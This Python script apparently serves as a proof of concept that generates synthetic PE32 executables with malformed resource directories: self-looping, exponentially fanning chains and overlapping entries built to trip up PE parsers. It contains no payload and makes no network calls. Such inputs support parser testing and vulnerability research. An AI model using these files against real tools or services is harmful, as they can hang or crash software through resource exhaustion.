#!/usr/bin/env python3
"""Generates synthetic PE32 files with malformed resource directories (no malware).
usage: gen_rsrc_poc.py {selfloop|chain|overlap} OUT [ENTRIES]"""
import struct, sys
mode, out = sys.argv[1], sys.argv[2]
N = int(sys.argv[3]) if len(sys.argv) > 3 else 100
DIR = 0x80000000
def rdir(entries):
    b = struct.pack('<IIHHHH', 0, 0, 0, 0, 0, len(entries))
    for i, off in enumerate(entries):
        b += struct.pack('<II', i, off)
    return b
dsz = 16 + 8 * N
if mode == 'selfloop':
    rs = rdir([DIR | 0] * N)
elif mode == 'chain':
    D = 5
    rs = b''
    for k in range(D):
        last = (k == D - 1)
        tgt = (D * dsz) if last else (DIR | ((k + 1) * dsz))
        rs += rdir([tgt] * N)
    rs += struct.pack('<IIII', 0x1000 + len(rs) + 16, 4, 0, 0) + b'\0' * 4  # data entry + payload
elif mode == 'overlap':
    # entry j points at a directory whose header starts on entry j of the root:
    # its entry counts are the words of the next entry's OffsetToData (high word >= 0x8000)
    rs = rdir([DIR | (16 + 8 * j) for j in range(N)])
    rs += b'\0' * 16
else:
    raise SystemExit('unknown mode')
rs = rs.ljust((len(rs) + 0x1ff) & ~0x1ff, b'\0')
hdr = bytearray(0x200)
hdr[0:2] = b'MZ'; struct.pack_into('<I', hdr, 0x3c, 0x40)
p = 0x40
hdr[p:p+4] = b'PE\0\0'
struct.pack_into('<HHIIIHH', hdr, p+4, 0x14c, 1, 0, 0, 0, 0xE0, 0x102)
o = p + 24
struct.pack_into('<HBBIIIIIIIIIHHHHHHIIIIHHIIIIII', hdr, o,
    0x10b, 0, 0, 0, 0, 0, 0, 0, 0x1000, 0x400000, 0x1000, 0x200,
    4, 0, 0, 0, 4, 0, 0, 0x2000, 0x200, 0, 3, 0, 0x100000, 0x1000, 0x100000, 0x1000, 0, 16)
dd = o + 96
struct.pack_into('<II', hdr, dd + 2 * 8, 0x1000, len(rs))
s = o + 0xE0
hdr[s:s+8] = b'.rsrc\0\0\0'
struct.pack_into('<IIIIIIHHI', hdr, s + 8, len(rs), 0x1000, len(rs), 0x200, 0, 0, 0, 0, 0x40000040)
open(out, 'wb').write(bytes(hdr) + rs)
